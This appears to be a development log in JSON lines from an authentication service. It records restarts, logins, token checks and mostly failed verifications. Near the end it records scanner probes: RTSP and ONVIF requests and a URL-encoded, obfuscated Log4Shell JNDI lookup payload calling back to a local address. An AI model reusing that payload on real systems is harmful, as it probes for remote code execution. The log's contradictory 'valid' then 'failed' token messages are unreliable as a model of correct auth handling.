{"timestamp":"2025-05-06T03:20:26.204Z","level":"info","context":"General","message":"Environment variables initialized."}
{"timestamp":"2025-05-06T03:20:26.221Z","level":"info","context":"General","message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-06T03:20:28.461Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T03:20:28.479Z","level":"info","context":"Token Verification","message":"Verifying token..."}
{"timestamp":"2025-05-06T03:20:28.490Z","level":"info","context":"General","message":"Response: 401 for POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T03:21:28.414Z","level":"info","context":"General","message":"SIGINT received. Closing Redis connection..."}
{"timestamp":"2025-05-06T03:21:32.085Z","level":"info","context":"General","message":"Logging initialized successfully."}
{"timestamp":"2025-05-06T03:21:32.089Z","level":"info","context":"Server","message":"Server is starting..."}
{"timestamp":"2025-05-06T03:21:32.090Z","level":"info","context":"General","message":"Environment variables initialized."}
{"timestamp":"2025-05-06T03:21:32.103Z","level":"info","context":"General","message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-06T03:21:34.108Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T03:21:34.128Z","level":"info","context":"Token Verification","message":"Verifying token..."}
{"timestamp":"2025-05-06T03:21:34.145Z","level":"info","context":"General","message":"Response: 401 for POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T03:27:35.375Z","level":"info","context":"General","message":"SIGINT received. Closing Redis connection..."}
{"timestamp":"2025-05-06T03:27:39.638Z","level":"info","context":"General","message":"Logging initialized successfully."}
{"timestamp":"2025-05-06T03:27:39.643Z","level":"info","context":"Server","message":"Server is starting..."}
{"timestamp":"2025-05-06T03:27:39.644Z","level":"info","context":"General","message":"Environment variables initialized."}
{"timestamp":"2025-05-06T03:27:39.657Z","level":"info","context":"General","message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-06T03:27:42.393Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T03:27:42.408Z","level":"info","context":"Token Verification","message":"Verifying token..."}
{"timestamp":"2025-05-06T03:27:42.413Z","level":"info","context":"General","message":"Response: 401 for POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T03:39:25.023Z","level":"info","context":"General","message":"SIGINT received. Closing Redis connection..."}
{"timestamp":"2025-05-06T03:39:29.923Z","level":"info","context":"General","message":"Logging initialized successfully."}
{"timestamp":"2025-05-06T03:39:29.928Z","level":"info","context":"Server","message":"Server is starting..."}
{"timestamp":"2025-05-06T03:39:29.931Z","level":"info","context":"General","message":"Environment variables initialized."}
{"timestamp":"2025-05-06T03:39:29.941Z","level":"info","context":"General","message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-06T03:39:33.224Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T03:39:33.237Z","level":"info","context":"Token Verification","message":"/verify..."}
{"timestamp":"2025-05-06T03:39:33.243Z","level":"info","context":"General","message":"Response: 401 for POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T03:40:55.455Z","level":"info","context":"General","message":"SIGINT received. Closing Redis connection..."}
{"timestamp":"2025-05-06T03:40:59.105Z","level":"info","context":"General","message":"Logging initialized successfully."}
{"timestamp":"2025-05-06T03:40:59.111Z","level":"info","context":"Server","message":"Server is starting..."}
{"timestamp":"2025-05-06T03:40:59.112Z","level":"info","context":"General","message":"Environment variables initialized."}
{"timestamp":"2025-05-06T03:40:59.129Z","level":"info","context":"General","message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-06T03:41:01.358Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T03:41:01.378Z","level":"info","context":"Token Verification","message":"/verify..."}
{"timestamp":"2025-05-06T03:41:01.391Z","level":"info","context":"General","message":"Response: 401 for POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T03:42:10.817Z","level":"info","context":"General","message":"SIGINT received. Closing Redis connection..."}
{"timestamp":"2025-05-06T03:42:14.457Z","level":"info","context":"General","message":"Logging initialized successfully."}
{"timestamp":"2025-05-06T03:42:14.463Z","level":"info","context":"Server","message":"Server is starting..."}
{"timestamp":"2025-05-06T03:42:14.466Z","level":"info","context":"General","message":"Environment variables initialized."}
{"timestamp":"2025-05-06T03:42:14.478Z","level":"info","context":"General","message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-06T03:42:16.443Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T03:42:16.461Z","level":"info","context":"Token Verification","message":"/verify..."}
{"timestamp":"2025-05-06T03:42:16.471Z","level":"info","context":"General","message":"Response: 401 for POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T03:43:40.464Z","level":"info","context":"General","message":"SIGINT received. Closing Redis connection..."}
{"timestamp":"2025-05-06T03:43:44.407Z","level":"info","context":"General","message":"Logging initialized successfully."}
{"timestamp":"2025-05-06T03:43:44.416Z","level":"info","context":"Server","message":"Server is starting..."}
{"timestamp":"2025-05-06T03:43:44.418Z","level":"info","context":"General","message":"Environment variables initialized."}
{"timestamp":"2025-05-06T03:43:44.431Z","level":"info","context":"General","message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-06T03:43:47.098Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T03:43:47.117Z","level":"info","context":"Token Verification","message":"/verify..."}
{"timestamp":"2025-05-06T03:43:47.123Z","level":"error","context":"General","message":"Error during token verification:"}
{"timestamp":"2025-05-06T03:43:47.129Z","level":"info","context":"General","message":"Response: 500 for POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T03:45:37.133Z","level":"info","context":"General","message":"SIGINT received. Closing Redis connection..."}
{"timestamp":"2025-05-06T03:45:40.921Z","level":"info","context":"General","message":"Logging initialized successfully."}
{"timestamp":"2025-05-06T03:45:40.926Z","level":"info","context":"Server","message":"Server is starting..."}
{"timestamp":"2025-05-06T03:45:40.927Z","level":"info","context":"General","message":"Environment variables initialized."}
{"timestamp":"2025-05-06T03:45:40.940Z","level":"info","context":"General","message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-06T03:45:42.943Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T03:45:42.966Z","level":"info","context":"Token Verification","message":"/verify..."}
{"timestamp":"2025-05-06T03:45:42.968Z","level":"error","context":"General","message":"Error during token verification:"}
{"timestamp":"2025-05-06T03:45:42.984Z","level":"info","context":"General","message":"Response: 500 for POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T03:47:47.734Z","level":"info","context":"General","message":"SIGINT received. Closing Redis connection..."}
{"timestamp":"2025-05-06T03:47:51.382Z","level":"info","context":"General","message":"Logging initialized successfully."}
{"timestamp":"2025-05-06T03:47:51.388Z","level":"info","context":"Server","message":"Server is starting..."}
{"timestamp":"2025-05-06T03:47:51.389Z","level":"info","context":"General","message":"Environment variables initialized."}
{"timestamp":"2025-05-06T03:47:51.401Z","level":"info","context":"General","message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-06T03:47:53.574Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T03:47:53.592Z","level":"info","context":"Token Verification","message":"/verify..."}
{"timestamp":"2025-05-06T03:47:53.593Z","level":"info","context":"General","message":"Verifying token:"}
{"timestamp":"2025-05-06T03:47:53.626Z","level":"info","context":"General","message":"Token is valid:"}
{"timestamp":"2025-05-06T03:47:53.637Z","level":"info","context":"General","message":"Response: 200 for POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-07T02:04:25.288Z","level":"info","context":"General","message":"SIGINT received. Closing Redis connection..."}
{"timestamp":"2025-05-07T02:04:29.282Z","level":"info","context":"General","message":"Logging initialized successfully."}
{"timestamp":"2025-05-07T02:04:29.284Z","level":"info","context":"Server","message":"Server is starting..."}
{"timestamp":"2025-05-07T02:04:29.286Z","level":"info","context":"General","message":"Environment variables initialized."}
{"timestamp":"2025-05-07T02:04:29.292Z","level":"info","context":"General","message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-07T02:05:43.017Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-07T02:05:43.033Z","level":"info","context":"Token Verification","message":"/verify..."}
{"timestamp":"2025-05-07T02:05:43.034Z","level":"info","context":"General","message":"Verifying token:"}
{"timestamp":"2025-05-07T02:05:43.038Z","level":"warn","context":"General","message":"Token is expired."}
{"timestamp":"2025-05-07T02:05:43.042Z","level":"info","context":"General","message":"Response: 200 for POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-07T02:09:41.827Z","level":"info","context":"AuthRoutes","message":"Request: GET /auth/users"}
{"timestamp":"2025-05-07T02:09:42.036Z","level":"info","context":"General","message":"___Connection acquired from pool!"}
{"timestamp":"2025-05-07T02:09:42.066Z","level":"info","context":"General","message":"Response: 200 for GET /auth/users"}
{"timestamp":"2025-05-07T02:10:12.617Z","level":"info","context":"General","message":"SIGINT received. Closing Redis connection..."}
{"timestamp":"2025-05-07T02:10:16.471Z","level":"info","context":"General","message":"Logging initialized successfully."}
{"timestamp":"2025-05-07T02:10:16.475Z","level":"info","context":"Server","message":"Server is starting..."}
{"timestamp":"2025-05-07T02:10:16.476Z","level":"info","context":"General","message":"Environment variables initialized."}
{"timestamp":"2025-05-07T02:10:16.482Z","level":"info","context":"General","message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-07T02:10:20.391Z","level":"info","context":"AuthRoutes","message":"Request: GET /auth/users"}
{"timestamp":"2025-05-07T02:10:20.401Z","level":"info","context":"General","message":"Response: 401 for GET /auth/users"}
{"timestamp":"2025-05-07T02:29:19.547Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/login"}
{"timestamp":"2025-05-07T02:29:19.562Z","level":"info","context":"Login Endpoint","message":"Login request received."}
{"timestamp":"2025-05-07T02:29:19.645Z","level":"info","context":"General","message":"___Connection acquired from pool!"}
{"timestamp":"2025-05-07T02:29:19.656Z","level":"info","context":"General","message":"___Connection acquired from pool!"}
{"timestamp":"2025-05-07T02:29:19.658Z","level":"info","context":"General","message":"Closing database connection..."}
{"timestamp":"2025-05-07T02:29:19.816Z","level":"info","context":"General","message":"Auth token issued"}
{"timestamp":"2025-05-07T02:29:19.818Z","level":"info","context":"General","message":"Refresh token issued:"}
{"timestamp":"2025-05-07T02:29:19.824Z","level":"info","context":"General","message":"Response: 200 for POST /auth/login"}
{"timestamp":"2025-05-07T02:29:26.978Z","level":"info","context":"AuthRoutes","message":"Request: GET /auth/protected"}
{"timestamp":"2025-05-07T02:29:26.983Z","level":"info","context":"General","message":"Response: 200 for GET /auth/protected"}
{"timestamp":"2025-05-07T02:29:40.808Z","level":"info","context":"AuthRoutes","message":"Request: GET /auth/protected"}
{"timestamp":"2025-05-07T02:29:40.811Z","level":"info","context":"General","message":"Response: 401 for GET /auth/protected"}
{"timestamp":"2025-05-07T02:30:01.003Z","level":"info","context":"AuthRoutes","message":"Request: GET /auth/protected"}
{"timestamp":"2025-05-07T02:30:01.005Z","level":"info","context":"General","message":"Response: 200 for GET /auth/protected"}
{"timestamp":"2025-05-07T02:30:37.870Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-07T02:30:37.871Z","level":"info","context":"Token Verification","message":"/verify..."}
{"timestamp":"2025-05-07T02:30:37.871Z","level":"info","context":"General","message":"Verifying token:"}
{"timestamp":"2025-05-07T02:30:37.873Z","level":"info","context":"General","message":"Token is valid:"}
{"timestamp":"2025-05-07T02:30:37.873Z","level":"error","context":"General","message":"Token verification failed:"}
{"timestamp":"2025-05-07T02:30:37.874Z","level":"info","context":"General","message":"Response: 200 for POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-07T02:37:36.498Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/login"}
{"timestamp":"2025-05-07T02:37:36.499Z","level":"info","context":"Login Endpoint","message":"Login request received."}
{"timestamp":"2025-05-07T02:37:36.560Z","level":"info","context":"General","message":"___Connection acquired from pool!"}
{"timestamp":"2025-05-07T02:37:36.564Z","level":"info","context":"General","message":"___Connection acquired from pool!"}
{"timestamp":"2025-05-07T02:37:36.565Z","level":"info","context":"General","message":"Closing database connection..."}
{"timestamp":"2025-05-07T02:37:36.724Z","level":"info","context":"General","message":"Auth token issued"}
{"timestamp":"2025-05-07T02:37:36.727Z","level":"info","context":"General","message":"Refresh token issued:"}
{"timestamp":"2025-05-07T02:37:36.729Z","level":"info","context":"General","message":"Response: 200 for POST /auth/login"}
{"timestamp":"2025-05-07T02:38:37.916Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-07T02:38:37.917Z","level":"info","context":"Token Verification","message":"/verify..."}
{"timestamp":"2025-05-07T02:38:37.918Z","level":"info","context":"General","message":"Verifying token:"}
{"timestamp":"2025-05-07T02:38:37.919Z","level":"info","context":"General","message":"Token is valid:"}
{"timestamp":"2025-05-07T02:38:37.920Z","level":"error","context":"General","message":"Token verification failed:"}
{"timestamp":"2025-05-07T02:38:37.921Z","level":"info","context":"General","message":"Response: 200 for POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-07T02:39:32.660Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-07T02:39:32.661Z","level":"info","context":"Token Verification","message":"/verify..."}
{"timestamp":"2025-05-07T02:39:32.662Z","level":"info","context":"General","message":"Verifying token:"}
{"timestamp":"2025-05-07T02:39:32.663Z","level":"info","context":"General","message":"Token is valid:"}
{"timestamp":"2025-05-07T02:39:32.663Z","level":"error","context":"General","message":"Token verification failed:"}
{"timestamp":"2025-05-07T02:39:32.665Z","level":"info","context":"General","message":"Response: 200 for POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-07T02:39:52.333Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-07T02:39:52.334Z","level":"info","context":"Token Verification","message":"/verify..."}
{"timestamp":"2025-05-07T02:39:52.334Z","level":"info","context":"General","message":"Verifying token:"}
{"timestamp":"2025-05-07T02:39:52.335Z","level":"info","context":"General","message":"Token is valid:"}
{"timestamp":"2025-05-07T02:39:52.335Z","level":"error","context":"General","message":"Token verification failed:"}
{"timestamp":"2025-05-07T02:39:52.336Z","level":"info","context":"General","message":"Response: 200 for POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-07T02:42:08.320Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-07T02:42:08.322Z","level":"info","context":"Token Verification","message":"/verify..."}
{"timestamp":"2025-05-07T02:42:08.322Z","level":"info","context":"General","message":"Verifying token:"}
{"timestamp":"2025-05-07T02:42:08.324Z","level":"info","context":"General","message":"Token is valid:"}
{"timestamp":"2025-05-07T02:42:08.325Z","level":"error","context":"General","message":"Token verification failed:"}
{"timestamp":"2025-05-07T02:42:08.327Z","level":"info","context":"General","message":"Response: 200 for POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-07T02:42:18.410Z","level":"info","context":"General","message":"SIGINT received. Closing Redis connection..."}
{"timestamp":"2025-05-07T02:42:22.069Z","level":"info","context":"General","message":"Logging initialized successfully."}
{"timestamp":"2025-05-07T02:42:22.073Z","level":"info","context":"Server","message":"Server is starting..."}
{"timestamp":"2025-05-07T02:42:22.075Z","level":"info","context":"General","message":"Environment variables initialized."}
{"timestamp":"2025-05-07T02:42:22.083Z","level":"info","context":"General","message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-07T02:42:24.535Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-07T02:42:24.550Z","level":"info","context":"Token Verification","message":"/verify..."}
{"timestamp":"2025-05-07T02:42:24.551Z","level":"info","context":"General","message":"Verifying token:"}
{"timestamp":"2025-05-07T02:42:24.555Z","level":"info","context":"General","message":"Token is valid:"}
{"timestamp":"2025-05-07T02:42:24.560Z","level":"error","context":"General","message":"Token verification failed:"}
{"timestamp":"2025-05-07T02:42:24.565Z","level":"info","context":"General","message":"Response: 200 for POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-07T02:42:39.001Z","level":"info","context":"AuthRoutes","message":"Request: GET /auth/protected"}
{"timestamp":"2025-05-07T02:42:39.011Z","level":"info","context":"General","message":"Response: 200 for GET /auth/protected"}
{"timestamp":"2025-05-07T03:00:05.513Z","level":"info","context":"General","message":"SIGINT received. Closing Redis connection..."}
{"timestamp":"2025-05-07T03:00:11.304Z","level":"info","context":"General","message":"Logging initialized successfully."}
{"timestamp":"2025-05-07T03:00:11.306Z","level":"info","context":"Server","message":"Server is starting..."}
{"timestamp":"2025-05-07T03:00:11.307Z","level":"info","context":"General","message":"Environment variables initialized."}
{"timestamp":"2025-05-07T03:00:11.314Z","level":"info","context":"General","message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-07T03:00:17.237Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/login"}
{"timestamp":"2025-05-07T03:00:17.253Z","level":"info","context":"Login Endpoint","message":"Login request received."}
{"timestamp":"2025-05-07T03:00:17.324Z","level":"info","context":"General","message":"___Connection acquired from pool!"}
{"timestamp":"2025-05-07T03:00:17.331Z","level":"info","context":"General","message":"___Connection acquired from pool!"}
{"timestamp":"2025-05-07T03:00:17.332Z","level":"info","context":"General","message":"Closing database connection..."}
{"timestamp":"2025-05-07T03:01:49.423Z","level":"info","context":"General","message":"Logging initialized successfully."}
{"timestamp":"2025-05-07T03:01:49.427Z","level":"info","context":"Server","message":"Server is starting..."}
{"timestamp":"2025-05-07T03:01:49.428Z","level":"info","context":"General","message":"Environment variables initialized."}
{"timestamp":"2025-05-07T03:01:49.440Z","level":"info","context":"General","message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-07T03:01:51.373Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/login"}
{"timestamp":"2025-05-07T03:01:51.387Z","level":"info","context":"Login Endpoint","message":"Login request received."}
{"timestamp":"2025-05-07T03:01:51.465Z","level":"info","context":"General","message":"___Connection acquired from pool!"}
{"timestamp":"2025-05-07T03:01:51.471Z","level":"info","context":"General","message":"___Connection acquired from pool!"}
{"timestamp":"2025-05-07T03:01:51.472Z","level":"info","context":"General","message":"Closing database connection..."}
{"timestamp":"2025-05-07T03:01:51.662Z","level":"info","context":"General","message":"Auth token issued"}
{"timestamp":"2025-05-07T03:01:51.667Z","level":"info","context":"General","message":"Refresh token issued:"}
{"timestamp":"2025-05-07T03:01:51.677Z","level":"info","context":"General","message":"Response: 200 for POST /auth/login"}
{"timestamp":"2025-05-07T03:12:47.894Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/login"}
{"timestamp":"2025-05-07T03:12:47.896Z","level":"info","context":"Login Endpoint","message":"Login request received."}
{"timestamp":"2025-05-07T03:12:47.983Z","level":"info","context":"General","message":"___Connection acquired from pool!"}
{"timestamp":"2025-05-07T03:12:47.991Z","level":"info","context":"General","message":"___Connection acquired from pool!"}
{"timestamp":"2025-05-07T03:12:47.992Z","level":"info","context":"General","message":"Closing database connection..."}
{"timestamp":"2025-05-07T03:12:48.162Z","level":"info","context":"General","message":"Auth token issued"}
{"timestamp":"2025-05-07T03:12:48.166Z","level":"info","context":"General","message":"Refresh token issued:"}
{"timestamp":"2025-05-07T03:12:48.169Z","level":"info","context":"General","message":"Response: 200 for POST /auth/login"}
{"timestamp":"2025-05-07T03:12:52.505Z","level":"info","context":"General","message":"SIGINT received. Closing Redis connection..."}
{"timestamp":"2025-05-07T03:12:56.077Z","level":"info","context":"General","message":"Logging initialized successfully."}
{"timestamp":"2025-05-07T03:12:56.081Z","level":"info","context":"Server","message":"Server is starting..."}
{"timestamp":"2025-05-07T03:12:56.082Z","level":"info","context":"General","message":"Environment variables initialized."}
{"timestamp":"2025-05-07T03:12:56.089Z","level":"info","context":"General","message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-07T03:12:59.529Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/login"}
{"timestamp":"2025-05-07T03:12:59.539Z","level":"info","context":"Login Endpoint","message":"Login request received."}
{"timestamp":"2025-05-07T03:12:59.624Z","level":"info","context":"General","message":"___Connection acquired from pool!"}
{"timestamp":"2025-05-07T03:12:59.631Z","level":"info","context":"General","message":"___Connection acquired from pool!"}
{"timestamp":"2025-05-07T03:12:59.633Z","level":"info","context":"General","message":"Closing database connection..."}
{"timestamp":"2025-05-07T03:12:59.811Z","level":"info","context":"General","message":"Auth token issued"}
{"timestamp":"2025-05-07T03:12:59.814Z","level":"info","context":"General","message":"Refresh token issued:"}
{"timestamp":"2025-05-07T03:12:59.824Z","level":"info","context":"General","message":"Response: 200 for POST /auth/login"}
{"timestamp":"2025-05-07T03:13:17.715Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-07T03:13:17.716Z","level":"info","context":"Token Verification","message":"/verify..."}
{"timestamp":"2025-05-07T03:13:17.716Z","level":"info","context":"General","message":"Verifying token:"}
{"timestamp":"2025-05-07T03:13:17.719Z","level":"info","context":"General","message":"Response: 200 for POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-07T03:16:39.273Z","level":"info","context":"General","message":"SIGINT received. Closing Redis connection..."}
{"timestamp":"2025-05-07T03:16:42.768Z","level":"info","context":"General","message":"Logging initialized successfully."}
{"timestamp":"2025-05-07T03:16:42.775Z","level":"info","context":"Server","message":"Server is starting..."}
{"timestamp":"2025-05-07T03:16:42.777Z","level":"info","context":"General","message":"Environment variables initialized."}
{"timestamp":"2025-05-07T03:16:42.789Z","level":"info","context":"General","message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-07T03:17:10.789Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-07T03:17:10.799Z","level":"info","context":"Token Verification","message":"/verify..."}
{"timestamp":"2025-05-07T03:17:10.800Z","level":"info","context":"General","message":"Verifying token:"}
{"timestamp":"2025-05-07T03:17:10.806Z","level":"info","context":"General","message":"Response: 200 for POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-07T03:17:44.167Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/token/verify?isRefreshToken=true"}
{"timestamp":"2025-05-07T03:17:44.169Z","level":"info","context":"Token Verification","message":"/verify..."}
{"timestamp":"2025-05-07T03:17:44.170Z","level":"info","context":"General","message":"Verifying token:"}
{"timestamp":"2025-05-07T03:17:44.172Z","level":"error","context":"General","message":"Invalid token signature."}
{"timestamp":"2025-05-07T03:17:44.173Z","level":"info","context":"General","message":"Response: 200 for POST /auth/token/verify?isRefreshToken=true"}
{"timestamp":"2025-05-07T03:17:54.824Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/token/verify?isRefreshToken=true"}
{"timestamp":"2025-05-07T03:17:54.825Z","level":"info","context":"Token Verification","message":"/verify..."}
{"timestamp":"2025-05-07T03:17:54.825Z","level":"info","context":"General","message":"Verifying token:"}
{"timestamp":"2025-05-07T03:17:54.826Z","level":"error","context":"General","message":"Invalid token signature."}
{"timestamp":"2025-05-07T03:17:54.827Z","level":"info","context":"General","message":"Response: 200 for POST /auth/token/verify?isRefreshToken=true"}
{"timestamp":"2025-05-07T03:25:20.262Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/token/verify?isRefreshToken=true"}
{"timestamp":"2025-05-07T03:25:20.263Z","level":"info","context":"Token Verification","message":"/verify..."}
{"timestamp":"2025-05-07T03:25:20.263Z","level":"info","context":"General","message":"Verifying token:"}
{"timestamp":"2025-05-07T03:25:20.264Z","level":"error","context":"General","message":"Invalid token signature."}
{"timestamp":"2025-05-07T03:25:20.265Z","level":"info","context":"General","message":"Response: 200 for POST /auth/token/verify?isRefreshToken=true"}
{"timestamp":"2025-05-07T14:13:22.096Z","level":"info","context":"AuthRoutes","message":"Request: OPTIONS rtsp://192.168.1.178/"}
{"timestamp":"2025-05-07T14:13:22.118Z","level":"info","context":"General","message":"Response: 404 for OPTIONS rtsp://192.168.1.178/"}
{"timestamp":"2025-05-07T14:13:22.130Z","level":"info","context":"AuthRoutes","message":"Request: POST /onvif/device_service"}
{"timestamp":"2025-05-07T14:13:22.140Z","level":"info","context":"General","message":"Response: 404 for POST /onvif/device_service"}
{"timestamp":"2025-05-07T14:13:32.160Z","level":"info","context":"AuthRoutes","message":"Request: GET /"}
{"timestamp":"2025-05-07T14:13:32.167Z","level":"info","context":"General","message":"Response: 404 for GET /"}
{"timestamp":"2025-05-07T14:13:32.213Z","level":"info","context":"AuthRoutes","message":"Request: GET /%24%7Bj%24%7Benv%3ATEST%3A-n%7Ddi%3A%24%7Blower%3Ad%7Dns%3A%2F%2F192.168.1.254%3A33087%2FazrrZnrchlZyGheQhVPYrwUrQQuLydBD%7D"}
{"timestamp":"2025-05-07T14:13:32.221Z","level":"info","context":"General","message":"Response: 404 for GET /%24%7Bj%24%7Benv%3ATEST%3A-n%7Ddi%3A%24%7Blower%3Ad%7Dns%3A%2F%2F192.168.1.254%3A33087%2FazrrZnrchlZyGheQhVPYrwUrQQuLydBD%7D"}
{"timestamp":"2025-05-07T14:13:36.318Z","level":"info","context":"General","message":"SIGINT received. Closing Redis connection..."}
{"timestamp":"2025-05-07T14:45:31.801Z","level":"info","context":"General","message":"Logging initialized successfully."}
{"timestamp":"2025-05-07T14:45:31.806Z","level":"info","context":"Server","message":"Server is starting..."}
{"timestamp":"2025-05-07T14:45:31.807Z","level":"info","context":"General","message":"Environment variables initialized."}
{"timestamp":"2025-05-07T14:45:31.816Z","level":"info","context":"General","message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-09T23:13:46.167Z","level":"info","context":"General","message":"SIGINT received. Closing Redis connection..."}
